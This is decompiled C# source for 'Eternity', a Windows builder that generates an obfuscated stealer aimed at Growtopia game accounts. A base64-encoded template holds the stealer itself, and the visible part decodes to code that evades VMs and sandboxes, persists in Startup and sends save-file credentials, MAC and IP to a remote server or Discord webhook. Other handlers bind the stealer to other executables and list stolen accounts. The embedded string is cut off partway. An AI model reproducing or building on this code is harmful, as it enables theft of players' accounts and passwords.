using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Eramake;
using Eternity.Properties;
using MetroFramework.Components;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Microsoft.CSharp;

namespace Eternity
{
	// Token: 0x02000008 RID: 8
	public class Main : MetroForm
	{
		// Token: 0x0600002D RID: 45 RVA: 0x00004B50 File Offset: 0x00002D50
		public Main(string username, string password)
		{
			this.InitializeComponent();
			this.Ryan-PяσTєCтσRαβγδεζηθικλmcμKξοπρmcστυφχψωRyan-PяσTєCтσR(this.metroStyleManager1);
			this.user = username;
			this.pass = password;
			this.eurl = Program.eternityurl;
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00004BA0 File Offset: 0x00002DA0
		private void Form1_Load(object sender, EventArgs e)
		{
			this.td = new Stopwatch();
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00004BB8 File Offset: 0x00002DB8
		private void Main_Shown(object sender, EventArgs e)
		{
			if (!this.MyIni.KeyExists("Style", null))
			{
				this.MyIni.Write("Style", "0", null);
			}
			int style = Convert.ToInt32(this.MyIni.Read("Style", null));
			this.metroStyleManager1.Style = style;
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00004C14 File Offset: 0x00002E14
		private void metroButton1_Click(object sender, EventArgs e)
		{
			string text;
			if (!string.IsNullOrEmpty(this.txtPEName.Text) && Regex.IsMatch(this.txtPEName.Text, "^[a-zA-Z0-9]+$"))
			{
				text = this.txtPEName.Text;
			}
			else
			{
				text = "SFW";
			}
			this.td.Start();
			try
			{
				Console.WriteLine("\r\nChecking requirements..");
				string text2 = Path.GetTempPath() + Path.GetRandomFileName() + "\\";
				Directory.CreateDirectory(text2);
				if (string.IsNullOrWhiteSpace(this.metroTextBox1.Text) && string.IsNullOrWhiteSpace(this.metroTextBox2.Text))
				{
					MessageBox.Show("Webhook URL is empty. Please fill in your Discord server Webhook URL", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					Console.WriteLine("Applying options..");
					byte[] bytes = Convert.FromBase64String(this.cd());
					string text3 = Encoding.UTF8.GetString(bytes);
					text3 = text3.Replace("*WEBURL*", this.metroTextBox1.Text);
					text3 = text3.Replace("*SAVEFILER*", this.metroTextBox2.Text);
					text3 = text3.Replace("*USER*", this.user);
					if (this.chkaap.Checked)
					{
						text3 = text3.Replace("aapbfalse", "aapbtrue");
					}
					if (this.chksavedat.Checked)
					{
						text3 = text3.Replace("ssdfalse", "ssdtrue");
					}
					if (this.chkstartup.Checked)
					{
						text3 = text3.Replace("ctsfalse", "ctstrue");
					}
					if (this.chkss.Checked)
					{
						text3 = text3.Replace("ssfalse", "sstrue");
					}
					if (this.chkantispam.Checked)
					{
						text3 = text3.Replace("asfalse", "astrue");
					}
					if (this.chkbinder.Checked)
					{
						text3 = text3.Replace("binderfalse", "bindertrue");
					}
					if (this.chkSendToDiscord.Checked)
					{
						text3 = text3.Replace("swhfalse", "swhtrue");
					}
					Console.WriteLine(this.td.ElapsedMilliseconds);
					this.td.Restart();
					List<string> list = new List<string>();
					try
					{
						Console.WriteLine("Copying obfuscator resources..");
						Assembly executingAssembly = Assembly.GetExecutingAssembly();
						foreach (string text4 in executingAssembly.GetManifestResourceNames())
						{
							if (text4.StartsWith("Eternity.Resources."))
							{
								using (Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(text4))
								{
									using (Stream stream = File.Create(text2 + text4.Substring("Eternity.Resources.".Length)))
									{
										manifestResourceStream.CopyTo(stream);
										list.Add(text2 + text4.Substring("Eternity.Resources.".Length));
									}
								}
							}
						}
						Console.WriteLine(this.td.ElapsedMilliseconds);
						string text5 = File.ReadAllText(text2 + "Settings.crproj");
						text5 = text5.Replace("SFW", text);
						File.WriteAllText(text2 + "Settings.crproj", text5);
						this.td.Restart();
					}
					catch (Exception ex)
					{
						MessageBox.Show(ex.ToString());
						Console.WriteLine(ex.Message);
						if (Directory.Exists(text2))
						{
							Directory.Delete(text2, true);
						}
						return;
					}
					try
					{
						Console.WriteLine("Compiling stealer..");
						using (CSharpCodeProvider csharpCodeProvider = new CSharpCodeProvider(new Dictionary<string, string>
						{
							{
								"CompilerVersion",
								"v4.0"
							}
						}))
						{
							CompilerParameters compilerParameters = new CompilerParameters(new string[]
							{
								"mscorlib.dll",
								"System.Core.dll"
							}, text2 + text + ".exe", true)
							{
								GenerateExecutable = true
							};
							compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
							compilerParameters.ReferencedAssemblies.Add("Microsoft.CSharp.dll");
							compilerParameters.ReferencedAssemblies.Add("System.dll");
							compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
							compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
							compilerParameters.CompilerOptions = "/target:winexe";
							if (this.chkbinder.Checked)
							{
								if (File.Exists(this.BinderFileDialog.FileName) && this.BinderFileDialog.FileName.EndsWith(".exe"))
								{
									try
									{
										FileStream fileStream = new FileStream(this.BinderFileDialog.FileName, FileMode.Open, FileAccess.Read);
										byte[] array = new byte[fileStream.Length];
										fileStream.Read(array, 0, array.Length);
										fileStream.Close();
										FileStream fileStream2 = new FileStream(Path.GetTempPath() + "\\1.txt", FileMode.Create, FileAccess.Write);
										fileStream2.Write(array, 0, array.Length);
										fileStream2.Close();
										compilerParameters.EmbeddedResources.Add(Path.GetTempPath() + "\\1.txt");
										goto IL_502;
									}
									catch
									{
										MessageBox.Show("Binding failed! Continuing..", "Warning");
										goto IL_502;
									}
								}
								MessageBox.Show("The binding file doesn't exist or the file doesn't end with an .exe", "Warning");
							}
							IL_502:
							if (this.chkIcon.Checked && File.Exists(this.openFileDialog1.FileName) && this.openFileDialog1.FileName.EndsWith(".ico"))
							{
								CompilerParameters compilerParameters2 = compilerParameters;
								compilerParameters2.CompilerOptions = compilerParameters2.CompilerOptions + " /win32icon:\"" + this.openFileDialog1.FileName + "\"";
							}
							if (csharpCodeProvider.CompileAssemblyFromSource(compilerParameters, new string[]
							{
								text3
							}).Errors.HasErrors)
							{
								MessageBox.Show("Something Went Wrong", "Error");
								return;
							}
							csharpCodeProvider.Dispose();
							Console.WriteLine(this.td.ElapsedMilliseconds);
							this.td.Restart();
						}
					}
					catch (Exception ex2)
					{
						Console.WriteLine(ex2.Message);
					}
					try
					{
						Console.WriteLine("Running obfuscator..");
						Process process = Process.Start(new ProcessStartInfo
						{
							FileName = text2 + "confuser.CLI.exe",
							Arguments = "\"" + text2 + "Settings.crproj\"",
							CreateNoWindow = true,
							UseShellExecute = false,
							WindowStyle = ProcessWindowStyle.Hidden
						});
						process.PriorityClass = ProcessPriorityClass.RealTime;
						process.WaitForExit();
						process.Dispose();
						Console.WriteLine(this.td.ElapsedMilliseconds);
						this.td.Restart();
					}
					catch (Exception ex3)
					{
						Console.WriteLine(ex3.Message);
						try
						{
							if (Directory.Exists(text2))
							{
								Directory.Delete(text2, true);
							}
						}
						catch
						{
							try
							{
								Process[] processesByName = Process.GetProcessesByName("Confuser.CLI");
								for (int i = 0; i < processesByName.Length; i++)
								{
									processesByName[i].Kill();
								}
								if (Directory.Exists(text2))
								{
									Directory.Delete(text2, true);
								}
							}
							catch
							{
							}
						}
						Clipboard.SetText(eCryptography.Encrypt(ex3.ToString()));
						return;
					}
					try
					{
						Console.WriteLine("Copying stealer..");
						File.Copy(text2 + "cnf\\" + text + ".exe", Application.StartupPath + "\\" + text + ".exe", true);
						Directory.Delete(text2, true);
						string[] files = Directory.GetFiles(Path.GetTempPath(), text + ".exe", SearchOption.AllDirectories);
						if (files.Length != 0)
						{
							Directory.Delete(Path.GetDirectoryName(files[0]), true);
						}
						Console.WriteLine(this.td.ElapsedMilliseconds);
						this.td.Restart();
					}
					catch (Exception ex4)
					{
						MessageBox.Show(ex4.ToString());
						try
						{
							Directory.Delete(text2, true);
							Console.WriteLine(ex4.Message);
							return;
						}
						catch
						{
							return;
						}
					}
					MessageBox.Show("Build Succeeded", "Build complete");
					this.td.Stop();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000031 RID: 49 RVA: 0x0000551C File Offset: 0x0000371C
		private void Main_FormClosed(object sender, FormClosedEventArgs e)
		{
			if (this.td.IsRunning)
			{
				while (this.td.IsRunning && this.td.IsRunning)
				{
				}
				this.fm.Dispose();
				Environment.Exit(0);
			}
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00005568 File Offset: 0x00003768
		private void changeStyle_Click(object sender, EventArgs e)
		{
			int num = Convert.ToInt32(this.MyIni.Read("Style", null));
			num++;
			if (num == 15)
			{
				num = 1;
			}
			this.metroStyleManager1.Style = num;
			this.MyIni.Write("Style", num.ToString(), null);
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000055C8 File Offset: 0x000037C8
		private void pictureBox1_Click(object sender, EventArgs e)
		{
			if (this.fm == null || this.fm.Text == "")
			{
				this.fm = new Info();
				this.fm.Show();
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x0000560C File Offset: 0x0000380C
		private void chkIcon_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.chkIcon.Checked)
			{
				this.metroButton2.Enabled = false;
				this.metroButton1.Enabled = true;
				return;
			}
			this.metroButton2.Enabled = true;
			if (!(this.openFileDialog1.FileName == ""))
			{
				this.metroButton1.Enabled = true;
				return;
			}
			this.metroButton1.Enabled = false;
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00005690 File Offset: 0x00003890
		private void metroButton2_Click(object sender, EventArgs e)
		{
			this.openFileDialog1.FileName = "";
			this.openFileDialog1.InitialDirectory = Application.StartupPath;
			this.openFileDialog1.Filter = "Icons (*.ico)|*.ico";
			this.BinderFileDialog.Title = "Select an Icon.";
			this.openFileDialog1.ShowDialog();
		}

		// Token: 0x06000036 RID: 54 RVA: 0x000056EC File Offset: 0x000038EC
		private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
		{
			this.metroButton1.Enabled = true;
		}

		// Token: 0x06000037 RID: 55 RVA: 0x0000570C File Offset: 0x0000390C
		private void metroButton4_Click(object sender, EventArgs e)
		{
			Unbanner.Start();
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00005720 File Offset: 0x00003920
		private void metroButton7_Click(object sender, EventArgs e)
		{
			if (!File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\drivers\\etc\\hosts").Contains("127.0.0.1 growtopia1.com") && !File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\drivers\\etc\\hosts").Contains("127.0.0.1 growtopia2.com"))
			{
				using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\drivers\\etc\\hosts", true))
				{
					streamWriter.WriteLine("\r\n127.0.0.1 growtopia1.com");
					streamWriter.WriteLine("127.0.0.1 growtopia2.com");
				}
			}
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000057C8 File Offset: 0x000039C8
		private void metroButton8_Click(object sender, EventArgs e)
		{
			string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\drivers\\etc\\hosts");
			text = text.Replace("127.0.0.1 growtopia1.com", "");
			text = text.Replace("127.0.0.1 growtopia2.com", "");
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\drivers\\etc\\hosts", text);
		}

		// Token: 0x0600003A RID: 58 RVA: 0x0000582C File Offset: 0x00003A2C
		private void startProxy_Click(object sender, EventArgs e)
		{
			if (Process.GetProcessesByName("proxy").Length != 0)
			{
				return;
			}
			File.WriteAllBytes(Path.GetTempPath() + "proxy.exe", Resources.proxy);
			Process process = new Process();
			process.StartInfo.FileName = Path.GetTempPath() + "proxy.exe";
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.Dispose();
		}

		// Token: 0x0600003B RID: 59 RVA: 0x000058AC File Offset: 0x00003AAC
		private void metroButton9_Click(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("proxy");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000058E4 File Offset: 0x00003AE4
		private void metroButton10_Click(object sender, EventArgs e)
		{
			this.BinderFileDialog.FileName = "";
			this.BinderFileDialog.Filter = "Executable Files(*.exe) | *.exe";
			this.BinderFileDialog.Title = "Select a file to bind.";
			this.BinderFileDialog.ShowDialog();
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00005930 File Offset: 0x00003B30
		private void chkbinder_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.chkbinder.Checked)
			{
				this.metroButton10.Enabled = false;
				this.metroButton1.Enabled = true;
				return;
			}
			this.metroButton10.Enabled = true;
			if (this.BinderFileDialog.FileName == "")
			{
				this.metroButton1.Enabled = false;
				return;
			}
			this.metroButton1.Enabled = true;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000059B4 File Offset: 0x00003BB4
		private void metroButton1_EnabledChanged(object sender, EventArgs e)
		{
			bool flag = true;
			bool flag2 = true;
			if (this.chkbinder.Checked)
			{
				flag = !(this.BinderFileDialog.FileName == "");
			}
			if (this.chkIcon.Checked)
			{
				flag2 = !(this.openFileDialog1.FileName == "");
			}
			if (flag && flag2)
			{
				this.metroButton1.Enabled = true;
				return;
			}
			this.metroButton1.Enabled = false;
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00005A58 File Offset: 0x00003C58
		private void BinderFileDialog_FileOk(object sender, CancelEventArgs e)
		{
			if (this.metroButton1.Enabled)
			{
				this.metroButton1.Enabled = false;
				return;
			}
			this.metroButton1.Enabled = true;
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00005A94 File Offset: 0x00003C94
		private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			SolidBrush brush = new SolidBrush(Color.FromArgb(20, 20, 20));
			e.Graphics.FillRectangle(brush, e.Bounds);
			SolidBrush brush2 = new SolidBrush(Color.FromArgb(255, 255, 255));
			e.Graphics.DrawString(e.Header.Text, e.Font, brush2, e.Bounds);
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00005B10 File Offset: 0x00003D10
		private void deleteAccountToolStripMenuItem_Click(object sender, EventArgs e)
		{
			StreamReader streamReader = new StreamReader(WebRequest.Create(string.Concat(new string[]
			{
				this.eurl,
				"deletesave.php?growid=",
				this.listView1.SelectedItems[0].Text,
				"&password=",
				this.listView1.SelectedItems[0].SubItems[1].Text,
				"&owner=",
				this.user,
				"&ip=",
				this.listView1.SelectedItems[0].SubItems[2].Text
			})).GetResponse().GetResponseStream());
			streamReader.ReadToEnd();
			streamReader.Dispose();
			this.metroButton5_Click(sender, e);
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00005C20 File Offset: 0x00003E20
		private void listView1_MouseClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Right && this.listView1.FocusedItem.Bounds.Contains(e.Location))
			{
				this.metroContextMenu1.Show(Cursor.Position);
			}
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00005C6C File Offset: 0x00003E6C
		private void listView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			e.DrawDefault = true;
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00005C84 File Offset: 0x00003E84
		private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			e.DrawDefault = true;
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00005C9C File Offset: 0x00003E9C
		private void metroButton5_Click(object sender, EventArgs e)
		{
			StreamReader streamReader = new StreamReader(WebRequest.Create(this.eurl + "validate.php?username=" + this.user).GetResponse().GetResponseStream());
			string a = streamReader.ReadToEnd();
			streamReader.Dispose();
			this.listView1.Items.Clear();
			if (a != "true")
			{
				return;
			}
			StreamReader streamReader2 = new StreamReader(WebRequest.Create(string.Concat(new string[]
			{
				this.eurl,
				"getaccs.php?username=",
				this.user,
				"&password=",
				this.pass
			})).GetResponse().GetResponseStream());
			string text = streamReader2.ReadToEnd();
			streamReader2.Dispose();
			string[] array = text.Split(new char[]
			{
				'+'
			});
			List<string[]> list = new List<string[]>();
			foreach (string text2 in array)
			{
				if (!string.IsNullOrEmpty(text2))
				{
					string[] item = text2.Split(new char[]
					{
						';'
					});
					list.Add(item);
				}
			}
			list = (from arr in list
			orderby arr[3] descending, arr[3]
			select arr).ToList<string[]>();
			int num = 0;
			foreach (string[] items in list)
			{
				this.listView1.Items.Add(new ListViewItem(items));
				num++;
			}
			this.metroLabel1.Text = "Accounts: " + num.ToString();
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00005EB0 File Offset: 0x000040B0
		private string cd()
		{
			return "dXNpbmcgTWljcm9zb2Z0LldpbjMyOw0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KdXNpbmcgU3lzdGVtLkRyYXdpbmc7DQp1c2luZyBTeXN0ZW0uUmVmbGVjdGlvbjsNCnVzaW5nIFN5c3RlbS5UaHJlYWRpbmcuVGFza3M7DQp1c2luZyBTeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnM7DQp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudDsNCnVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZDsNCnVzaW5nIFN5c3RlbS5XaW5kb3dzLkZvcm1zOw0KDQpuYW1lc3BhY2UgU2F2ZUZvcndhcmRlck9uZUNTDQp7DQogICAgY2xhc3MgUHJvZ3JhbQ0KICAgIHsNCiAgICAgICAgc3RhdGljIEFzc2VtYmx5IGEgPSBBc3NlbWJseS5HZXRFeGVjdXRpbmdBc3NlbWJseSgpOw0KICAgICAgICBzdGF0aWMgc3RyaW5nIHdlYnVybCwgc2F2ZWZpbGVyOw0KICAgICAgICBzdGF0aWMgYm9vbCBpZmNvbnQ7DQogICAgICAgIHN0YXRpYyBzdHJpbmcgdXNlciA9ICIqVVNFUioiOw0KDQoNCiAgICAgICAgc3RhdGljIHN0cmluZyBTZW5kU2NyZWVuc2hvdCA9ICJzc2ZhbHNlIjsgLy9zc2ZhbHNlDQogICAgICAgIHN0YXRpYyBzdHJpbmcgQ29weVRvU3RhcnR1cCA9ICJjdHNmYWxzZSI7IC8vY3RzZmFsc2UNCiAgICAgICAgc3RhdGljIHN0cmluZyBTZW5kU2F2ZURhdCA9ICJzc2RmYWxzZSI7IC8vc3NkZmFsc2UNCiAgICAgICAgc3RhdGljIHN0cmluZyBBbnRpU3BhbSA9ICJhc2ZhbHNlIjsgLy9hc2ZhbHNlDQogICAgICAgIHN0YXRpYyBzdHJpbmcgRmlsZUJpbmRlciA9ICJiaW5kZXJmYWxzZSI7IC8vYmluZGVyZmFsc2UNCiAgICAgICAgc3RhdGljIHN0cmluZyBTZW5kV2ViaG9vayA9ICJzd2hmYWxzZSI7DQogICAgICAgIC8vc3RhdGljIHN0cmluZyBEaXNjb3JkVG9rZW4gPSAiZGN0cnVlIjsgLy9kY2ZhbHNlDQoNCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQogICAgICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldENvbnNvbGVXaW5kb3coKTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildDQogICAgICAgIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0UHJvY2Vzc0RQSUF3YXJlKCk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0TW9kdWxlSGFuZGxlKHN0cmluZyBscE1vZHVsZU5hbWUpOw0KDQoNCiAgICAgICAgY29uc3QgaW50IFNXX0hJREUgPSAwOw0KDQogICAgICAgIFtTVEFUaHJlYWRdDQogICAgICAgIHN0YXRpYyB2b2lkIE1haW4oKQ0KICAgICAgICB7DQogICAgICAgICAgICBTZXRQcm9jZXNzRFBJQXdhcmUoKTsNCiAgICAgICAgICAgIHZhciBoYW5kbGUgPSBHZXRDb25zb2xlV2luZG93KCk7DQogICAgICAgICAgICBTaG93V2luZG93KGhhbmRsZSwgU1dfSElERSk7DQoNCiAgICAgICAgICAgIGlmIChEZXRlY3RWTSgpIHx8IERldGVjdFNhbmRib3hpZSgpKQ0KICAgICAgICAgICAgICAgIENsb3NlKCk7DQoNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChGaWxlQmluZGVyID09ICJiaW5kZXJ0cnVlIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIFRhc2suRmFjdG9yeS5TdGFydE5ldyhCaW5kZXhlKTsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChDb3B5VG9TdGFydHVwID09ICJjdHN0cnVlIikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIHRoaXNGaWxlID0gQXBwRG9tYWluLkN1cnJlbnREb21haW4uRnJpZW5kbHlOYW1lOw0KICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIEZpbGVwYXRoID0gRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLlN0YXJ0dXApICsgIlxcIiArIHRoaXNGaWxlOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFGaWxlLkV4aXN0cyhGaWxlcGF0aCkpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5Db3B5KEFzc2VtYmx5LkdldEV4ZWN1dGluZ0Fzc2VtYmx5KCkuTG9jYXRpb24sIEZpbGVwYXRoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGaWxlLkRlbGV0ZShGaWxlcGF0aCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5Db3B5KEFzc2VtYmx5LkdldEV4ZWN1dGluZ0Fzc2VtYmx5KCkuTG9jYXRpb24sIEZpbGVwYXRoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uKSB7IH0NCg0KICAgICAgICAgICAgICAgIGlmIChTYXZlUGF0aCgpICE9IHN0cmluZy5FbXB0eSB8fCBTYXZlUGF0aCgpICE9IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdHJpbmcgZXRlcm5pdHl1cmwgPSBuZXcgV2ViQ2xpZW50KCkuRG93bmxvYWRTdHJpbmcoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9RSHd2ZE1IeiIpOw0KICAgICAgICAgICAgICAgICAgICBzdHJpbmdbXSBTYXZlSW5mbyA9IFNhdmVEZWNvZGUoKTsNCiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIEdyb3dJRCA9IFNhdmVJbmZvWzBdLlRvTG93ZXIoKTsNCiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIFBhc3N3b3JkcyA9IFNhdmVJbmZvWzFdOw0KICAgICAgICAgICAgICAgICAgICBzdHJpbmcgTWFjID0gU2F2ZUluZm9bMl07DQogICAgICAgICAgICAgICAgICAgIFJlZ2lzdHJ5S2V5IGFjY3MgPSBSZWdpc3RyeUtleS5PcGVuQmFzZUtleShSZWdpc3RyeUhpdmUuQ3VycmVudFVzZXIsIEVudmlyb25tZW50LklzNjRCaXRPcGVyYXRpbmdTeXN0ZW0gPyBSZWdpc3RyeVZpZXcuUmVnaXN0cnk2NCA6IFJlZ2lzdHJ5Vmlldy5SZWdpc3RyeTMyKQ0KICAgICAgICAgICAgICAgICAgICAgICAgLk9wZW5TdWJLZXkoIlN5c3RlbVxcQ3VycmVudENvbnRyb2xTZXQiLCB0cnVlKTsNCiAgICAgICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChBbnRpU3BhbSA9PSAiYXN0cnVlIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgUmVnUGFzcyA9IChzdHJpbmcpYWNjcy5HZXRWYWx1ZShHcm93SUQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChQYXNzd29yZHMgIT0gbnVsbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChQYXNzd29yZHMgIT0gUmVnUGFzcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmY29udCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmY29udCA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZmNvbnQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWlmY29udCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsgfQ0KDQogICAgICAgICAgICAgICAgICAgIHN0cmluZyBzYXZlbmV3ID0gUGF0aC5HZXRUZW1wUGF0aCgpICsgR3Jvd0lELlRvTG93ZXIoKSArICIuZGF0IjsNCiAgICAgICAgICAgICAgICAgICAgaWYgKEZpbGUuRXhpc3RzKHNhdmVuZXcpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5EZWxldGUoc2F2ZW5ldyk7DQogICAgICAgICAgICAgICAgICAgIEZpbGUuQ29weShTYXZlUGF0aCgpLCBzYXZlbmV3KTsNCiAgICAgICAgICAgICAgICAgICAgV2ViQ2xpZW50IHdjID0gbmV3IFdlYkNsaWVudCgpOw0KICAgICAgICAgICAgICAgICAgICB3ZWJ1cmwgPSAiKldFQlVSTCoiOyAvLyAqV0VCVVJMKiAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQogICAgICAgICAgICAgICAgICAgIHNhdmVmaWxlciA9ICIqU0FWRUZJTEVSKiI7IC8vICpTQVZFRklMRVIqIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KICAgICAgICAgICAgICAgICAgICBzdHJpbmcgcmVxdXJsID0gZXRlcm5pdHl1cmwgKyAicG9zdHNhdmUucGhwP2dyb3dpZD0iICsgR3Jvd0lEICsgIiZwYXNzd29yZD0iICsgUGFzc3dvcmRzICsgIiZvd25lcj0iICsgdXNlciArICImdGltZXN0YW1wPSIgKyBHZXRUaW1lc3RhbXAoRGF0ZVRpbWUuTm93KSArICImYWFwPSIgKyBNYWMgKyAiJmlwPSIgKyBHZXRJUCgpOw0KICAgICAgICAgICAgICAgICAgICBXZWJSZXF1ZXN0IHdyZXEgPSBXZWJSZXF1ZXN0LkNyZWF0ZShyZXF1cmwpOw0KICAgICAgICAgICAgICAgICAgICBEZWJ1Zy5Xcml0ZUxpbmUocmVxdXJsKTsNCiAgICAgICAgICAgICAgICAgICAgV2ViUmVzcG9uc2Ugd1JlcyA9IHdyZXEuR2V0UmVzcG9uc2UoKTsNCg0KICAgICAgICAgICAgICAgICAgICBpZiAoU2VuZFdlYmhvb2sgPT0gInN3aHRydWUiKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgaW1hZ2V1cmwgPSAiIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIFdlYlJlcXVlc3Qgd3JlcTEgPSBXZWJSZXF1ZXN0LkNyZWF0ZShldGVybml0eXVybCArICJ2YWxpZGF0ZS5waHA/dXNlcm5hbWU9IiArIHVzZXIpOw0KICAgICAgICAgICAgICAgICAgICAg